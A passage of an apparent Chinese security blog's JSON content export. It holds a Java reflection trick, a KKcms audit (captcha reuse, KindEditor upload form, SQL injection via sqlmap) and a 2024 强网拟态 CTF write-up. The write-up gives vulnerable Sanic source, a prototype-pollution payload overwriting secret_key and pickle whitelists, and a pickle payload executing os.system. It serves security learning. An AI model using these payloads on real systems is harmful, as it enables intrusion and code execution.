class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这样使修改不成功的，但是还是可以修改，通过反射将name字段取出来后将final修饰符去掉就可以修改</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> src;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xpath.internal.operations.Mod;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.File;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Modifier;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">finalstaticflectioncalc</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">finalstaticreflection</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">finalstaticreflection</span>();</span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> c.getClass().getDeclaredMethod(<span class=\"string\">&quot;printName&quot;</span>);</span><br><span class=\"line\">        c.printName();</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">f</span> <span class=\"operator\">=</span> c.getClass().getDeclaredField(<span class=\"string\">&quot;name&quot;</span>);</span><br><span class=\"line\">        f.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">ff</span> <span class=\"operator\">=</span> f.getClass().getDeclaredField(<span class=\"string\">&quot;modifiers&quot;</span>);</span><br><span class=\"line\">        ff.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        ff.setInt(f,f.getModifiers() &amp; ~Modifier.FINAL);<span class=\"comment\">//去掉final修饰符</span></span><br><span class=\"line\">        f.set(c,<span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>(<span class=\"string\">&quot;lllllvzhouhang&quot;</span>));</span><br><span class=\"line\">        ff.setInt(f,f.getModifiers() &amp; ~Modifier.FINAL);<span class=\"comment\">//加上final修饰符</span></span><br><span class=\"line\">        c.printName();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这样就成功修改了</p>\n","categories":["JAVA"],"tags":["JAVA"]},{"title":"KKcms代审","url":"/2024/10/15/KKcms%E4%BB%A3%E5%AE%A1/","content":"<h1 id=\"环境安装\"><a href=\"#环境安装\" class=\"headerlink\" title=\"环境安装\"></a>环境安装</h1><p>源码下载地址：<a href=\"https://github.com/erichuang2015/kkcms\">https://github.com/erichuang2015/kkcms</a></p>\n<p>php5.6 .9+mysql5.7.26+apache2.4.39</p>\n<h1 id=\"审计\"><a href=\"#审计\" class=\"headerlink\" title=\"审计\"></a>审计</h1><h3 id=\"验证码复用\"><a href=\"#验证码复用\" class=\"headerlink\" title=\"验证码复用\"></a>验证码复用</h3><p><img src=\"/pic/kkcms/verify1.png\"></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img src=<span class=\"string\">&quot;../system/verifycode.php&quot;</span> onclick=<span class=\"string\">&quot;javascript:this.src=&#x27;../system/verifycode.php?&#x27;+Math.random()&quot;</span> style=<span class=\"string\">&quot;cursor:pointer;&quot;</span> alt=<span class=\"string\">&quot;点击更换&quot;</span> title=<span class=\"string\">&quot;点击更换&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这串代码用来执行js代码更换验证码，但是bp它默认不加载js，所以造成了验证码复用。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"variable\">$image</span> = <span class=\"title function_ invoke__\">imagecreate</span>(<span class=\"number\">50</span>, <span class=\"number\">34</span>);</span><br><span class=\"line\"><span class=\"variable\">$bcolor</span> = <span class=\"title function_ invoke__\">imagecolorallocate</span>(<span class=\"variable\">$image</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$fcolor</span> = <span class=\"title function_ invoke__\">imagecolorallocate</span>(<span class=\"variable\">$image</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>);</span><br><span class=\"line\"><span class=\"variable\">$str</span> = <span class=\"string\">&#x27;0123456789&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$rand_str</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"number\">4</span>; <span class=\"variable\">$i</span>++)&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$k</span> = <span class=\"title function_ invoke__\">mt_rand</span>(<span class=\"number\">1</span>, <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$str</span>));</span><br><span class=\"line\">\t<span class=\"variable\">$rand_str</span> .= <span class=\"variable\">$str</span>[<span class=\"variable\">$k</span> - <span class=\"number\">1</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;verifycode&#x27;</span>] = <span class=\"variable\">$rand_str</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">imagefill</span>(<span class=\"variable\">$image</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"variable\">$bcolor</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">imagestring</span>(<span class=\"variable\">$image</span>, <span class=\"number\">7</span>, <span class=\"number\">7</span>, <span class=\"number\">10</span>, <span class=\"variable\">$rand_str</span>, <span class=\"variable\">$fcolor</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&#x27;content-type:image/png&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">imagepng</span>(<span class=\"variable\">$image</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>verifycode.php的代码，就是生成一个随机的4位0-9的图片验证码</p>\n<h3 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h3><p>这个cms默认用的编辑器是KindEditor,版本是4.1.10，构造payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;http://127.0.0.1/editor/php/upload_json.php&quot; method=&quot;post&quot;&gt; Upload a new file:&lt;br&gt; &lt;input type=&quot;file&quot; name=&quot;imgFile&quot; size=&quot;50&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt; &lt;/form&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>可以直接上传文件，但是没什么用。</p>\n<p><img src=\"/pic/kkcms/upload1.png\"></p>\n<p>而且他有白名单，只能上传指定的后缀文件。</p>\n<h3 id=\"前台sql注入\"><a href=\"#前台sql注入\" class=\"headerlink\" title=\"前台sql注入\"></a>前台sql注入</h3><p>在<code>template\\wapian\\vlist.php</code>这里</p>\n<p><img src=\"/pic/kkcms/sql1.png\"></p>\n<p>我们可以看到他没有任何的防护，但其实是有防护的,vlist.php里包含了system/inc.php,而inc.php中有一个转义的函数</p>\n<p><img src=\"/pic/kkcms/sql2.png\"></p>\n<p>但是这里为什么可以注入呢？是因为这里是数字型注入，没有用双引号包裹，自然也不用双引号进行闭合，addslashes也就没起上作用,放进sqlmap里就可以跑出来。</p>\n<p><img src=\"/pic/kkcms/sql3.png\"></p>\n<h3 id=\"前台sql注入2\"><a href=\"#前台sql注入2\" class=\"headerlink\" title=\"前台sql注入2\"></a>前台sql注入2</h3><p>在ucenter\\reg.php里</p>\n<p><img src=\"/pic/kkcms/sql4.png\"></p>\n<p>这里为什么可以注入呢？这里是因为他有一个stripslashes函数，它会删除由addslashes添加上的斜杠，放进sqlmap里跑</p>\n<p><img src=\"/pic/kkcms/sql5.png\"></p>\n<p>也是可以跑出来盲注。搜索stripslashes关键字，可以找到repass.php和active.php同样有注入。</p>\n<h3 id=\"后台sql注入\"><a href=\"#后台sql注入\" class=\"headerlink\" title=\"后台sql注入\"></a>后台sql注入</h3><p>在cms_usergroup_edit.php处</p>\n<p><img src=\"/pic/kkcms/sql6.png\"></p>\n<p>修改会员级别处有盲注，但是sql跑不出来不知道为什么。然后和此处一样的还有cms_ad_edit.php、cms_admin_edit.php、cms_book_edit.php、cms_channel_edit.php</p>\n<p>还有一处</p>\n<p><img src=\"/pic/kkcms/sql7.png\"></p>\n<p>这里有delete注入，整个后台的delete语句全是这样写的。</p>\n<hr>\n<p>XSS漏洞就不审计了，这个cms就这样吧，一个比较简单的cms。</p>\n","categories":["代码审计"],"tags":["web","代码审计"]},{"title":"2024强网拟态复盘","url":"/2024/10/21/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%A4%8D%E7%9B%98/","content":"<p>web复盘一下吧只做出来了两道，所有题都有一点思路，但是只有一点点可惜可惜，太可惜了。</p>\n<h1 id=\"capoo\"><a href=\"#capoo\" class=\"headerlink\" title=\"capoo\"></a>capoo</h1><p>这是个非预期，capoo.php可以任意文件读取，能读取到start.sh,start.sh中泄露了flag的名字，直接读取就行</p>\n<h1 id=\"ez-picker\"><a href=\"#ez-picker\" class=\"headerlink\" title=\"ez_picker\"></a>ez_picker</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#源码</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> sanic <span class=\"keyword\">import</span> Sanic</span><br><span class=\"line\"><span class=\"keyword\">from</span> sanic.response <span class=\"keyword\">import</span> json,file <span class=\"keyword\">as</span> file_,text,redirect</span><br><span class=\"line\"><span class=\"keyword\">from</span> sanic_cors <span class=\"keyword\">import</span> CORS</span><br><span class=\"line\"><span class=\"keyword\">from</span> key <span class=\"keyword\">import</span> secret_key</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> jwt</span><br><span class=\"line\"><span class=\"keyword\">import</span> io</span><br><span class=\"line\"><span class=\"keyword\">import</span> builtins</span><br><span class=\"line\">app = Sanic(<span class=\"string\">&quot;App&quot;</span>)</span><br><span class=\"line\">pickle_file = <span class=\"string\">&quot;data.pkl&quot;</span></span><br><span class=\"line\">my_object = &#123;&#125;</span><br><span class=\"line\">users = []</span><br><span class=\"line\"></span><br><span class=\"line\">safe_modules = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;math&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;datetime&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;json&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;collections&#x27;</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">safe_names = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;sqrt&#x27;</span>, <span class=\"string\">&#x27;pow&#x27;</span>, <span class=\"string\">&#x27;sin&#x27;</span>, <span class=\"string\">&#x27;cos&#x27;</span>, <span class=\"string\">&#x27;tan&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;date&#x27;</span>, <span class=\"string\">&#x27;datetime&#x27;</span>, <span class=\"string\">&#x27;timedelta&#x27;</span>, <span class=\"string\">&#x27;timezone&#x27;</span>, </span><br><span class=\"line\">    <span class=\"string\">&#x27;loads&#x27;</span>, <span class=\"string\">&#x27;dumps&#x27;</span>,  </span><br><span class=\"line\">    <span class=\"string\">&#x27;namedtuple&#x27;</span>, <span class=\"string\">&#x27;deque&#x27;</span>, <span class=\"string\">&#x27;Counter&#x27;</span>, <span class=\"string\">&#x27;defaultdict&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">find_class</span>(<span class=\"params\">self, module, name</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> module <span class=\"keyword\">in</span> safe_modules <span class=\"keyword\">and</span> name <span class=\"keyword\">in</span> safe_names:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">getattr</span>(builtins, name)</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> pickle.UnpicklingError(<span class=\"string\">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %(module, name))</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">restricted_loads</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class=\"line\"></span><br><span class=\"line\">CORS(app, supports_credentials=<span class=\"literal\">True</span>, origins=[<span class=\"string\">&quot;http://localhost:8000&quot;</span>, <span class=\"string\">&quot;http://127.0.0.1:8000&quot;</span>])</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">User</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self,username,password</span>):</span><br><span class=\"line\">        self.username=username</span><br><span class=\"line\">        self.password=password</span><br><span class=\"line\">        </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">token_required</span>(<span class=\"params\">func</span>):</span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">wrapper</span>(<span class=\"params\">request, *args, **kwargs</span>):</span><br><span class=\"line\">        token = request.cookies.get(<span class=\"string\">&quot;token&quot;</span>)  </span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> token:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(<span class=\"string\">&#x27;/login&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            result=jwt.decode(token, <span class=\"built_in\">str</span>(secret_key), algorithms=[<span class=\"string\">&#x27;HS256&#x27;</span>], options=&#123;<span class=\"string\">&quot;verify_signature&quot;</span>: <span class=\"literal\">True</span>&#125;)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> jwt.ExpiredSignatureError:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> json(&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;fail&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Token expired&quot;</span>&#125;, status=<span class=\"number\">401</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> jwt.InvalidTokenError:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> json(&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;fail&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Invalid token&quot;</span>&#125;, status=<span class=\"number\">401</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(result)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> result[<span class=\"string\">&quot;role&quot;</span>]!=<span class=\"string\">&quot;admin&quot;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> json(&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;fail&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Permission Denied&quot;</span>&#125;, status=<span class=\"number\">401</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> func(request, *args, **kwargs)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> wrapper</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span>, methods=[<span class=\"string\">&quot;GET&quot;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">file_reader</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    file = <span class=\"string\">&quot;app.py&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file, <span class=\"string\">&#x27;r&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        content = f.read()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> text(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/upload&#x27;</span>, methods=[<span class=\"string\">&quot;GET&quot;</span>,<span class=\"string\">&quot;POST&quot;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"meta\">@token_required</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">upload</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method==<span class=\"string\">&quot;GET&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> file_(<span class=\"string\">&#x27;templates/upload.html&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> request.files:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;No file provided&quot;</span>, status=<span class=\"number\">400</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    file = request.files.get(<span class=\"string\">&#x27;file&#x27;</span>)</span><br><span class=\"line\">    file_object = file[<span class=\"number\">0</span>] <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(file, <span class=\"built_in\">list</span>) <span class=\"keyword\">else</span> file</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        new_data = restricted_loads(file_object.body)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            my_object.update(new_data)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> json(&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;success&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Pickle object loaded but not updated&quot;</span>&#125;)</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(pickle_file, <span class=\"string\">&quot;wb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            pickle.dump(my_object, f)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> json(&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;success&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Pickle object updated&quot;</span>&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> pickle.UnpicklingError:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;Dangerous pickle file&quot;</span>, status=<span class=\"number\">400</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/register&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>,<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">register</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method==<span class=\"string\">&#x27;GET&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> file_(<span class=\"string\">&#x27;templates/register.html&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.json:</span><br><span class=\"line\">        NewUser=User(<span class=\"string\">&quot;username&quot;</span>,<span class=\"string\">&quot;password&quot;</span>)</span><br><span class=\"line\">        merge(request.json, NewUser)</span><br><span class=\"line\">        users.append(NewUser)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> json(&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;fail&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Invalid request&quot;</span>&#125;, status=<span class=\"number\">400</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json(&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;success&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Register Success!&quot;</span>,<span class=\"string\">&quot;redirect&quot;</span>: <span class=\"string\">&quot;/login&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/login&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>,<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">login</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method==<span class=\"string\">&#x27;GET&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> file_(<span class=\"string\">&#x27;templates/login.html&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.json:</span><br><span class=\"line\">        username = request.json.get(<span class=\"string\">&quot;username&quot;</span>)</span><br><span class=\"line\">        password = request.json.get(<span class=\"string\">&quot;password&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> username <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> password:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> json(&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;fail&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Username or password missing&quot;</span>&#125;, status=<span class=\"number\">400</span>)</span><br><span class=\"line\">        user = <span class=\"built_in\">next</span>((u <span class=\"keyword\">for</span> u <span class=\"keyword\">in</span> users <span class=\"keyword\">if</span> u.username == username), <span class=\"literal\">None</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> user:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> user.password == password:</span><br><span class=\"line\">                data=&#123;<span class=\"string\">&quot;user&quot;</span>:username,<span class=\"string\">&quot;role&quot;</span>:<span class=\"string\">&quot;guest&quot;</span>&#125;</span><br><span class=\"line\">                data[<span class=\"string\">&#x27;exp&#x27;</span>] = <span class=\"built_in\">int</span>(time.time()) + <span class=\"number\">60</span> *<span class=\"number\">5</span></span><br><span class=\"line\">                token = jwt.encode(data, <span class=\"built_in\">str</span>(secret_key), algorithm=<span class=\"string\">&#x27;HS256&#x27;</span>)</span><br><span class=\"line\">                response = json(&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;success&quot;</span>, <span class=\"string\">&quot;redirect&quot;</span>: <span class=\"string\">&quot;/upload&quot;</span>&#125;)</span><br><span class=\"line\">                response.cookies[<span class=\"string\">&quot;token&quot;</span>]=token</span><br><span class=\"line\">                response.headers[<span class=\"string\">&#x27;Access-Control-Allow-Origin&#x27;</span>] = request.headers.get(<span class=\"string\">&#x27;origin&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> response</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> json(&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;fail&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Invalid password&quot;</span>&#125;, status=<span class=\"number\">400</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> json(&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;fail&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;User not found&quot;</span>&#125;, status=<span class=\"number\">404</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json(&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;fail&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Invalid request&quot;</span>&#125;, status=<span class=\"number\">400</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">&quot;0.0.0.0&quot;</span>, port=<span class=\"number\">8000</span>)</span><br></pre></td></tr></table></figure>\n\n<p>考点就是原型链污染+pickle反序列化+jwt伪造，我当时感觉最难的是那个pickle反序列化，因为他是白名单虽然可以通过原型链污染进行修改但是这是由于对原理以及内建模块的不熟悉导致的，其实只需要把用到的模块和命令加入就行比如<code>builtins</code>、<code>getattr</code>、<code>popen</code>加入就好了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#污染链</span></span><br><span class=\"line\">&#123;<span class=\"string\">&quot;__init__&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span>:&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;secret_key&quot;</span>:<span class=\"string\">&quot;66666&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;safe_modules&quot;</span>:[<span class=\"string\">&quot;os&quot;</span>],</span><br><span class=\"line\">            <span class=\"string\">&quot;safe_names&quot;</span>:[<span class=\"string\">&quot;eval&quot;</span>],</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#pickle链</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;&#x27;&#x27;(cos</span></span><br><span class=\"line\"><span class=\"string\">eval</span></span><br><span class=\"line\"><span class=\"string\">S&#x27;os.system(\\&quot;calc\\&quot;)&#x27;</span></span><br><span class=\"line\"><span class=\"string\">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Spreader\"><a href=\"#Spreader\" class=\"headerlink\" title=\"Spreader\"></a>Spreader</h1><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"># app.<span class=\"property\">js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> session = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express-session&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> stringRandom = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;string-random&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> bodyParser = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;body-parser&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> app = <span class=\"title function_\">express</span>();</span><br><span class=\"line\"><span class=\"keyword\">const</span> port = <span class=\"number\">3000</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title class_\">AdminPassWord</span>=<span class=\"title function_\">stringRandom</span>(<span class=\"number\">16</span>, &#123; <span class=\"attr\">numbers</span>: <span class=\"literal\">true</span> &#125;)</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title 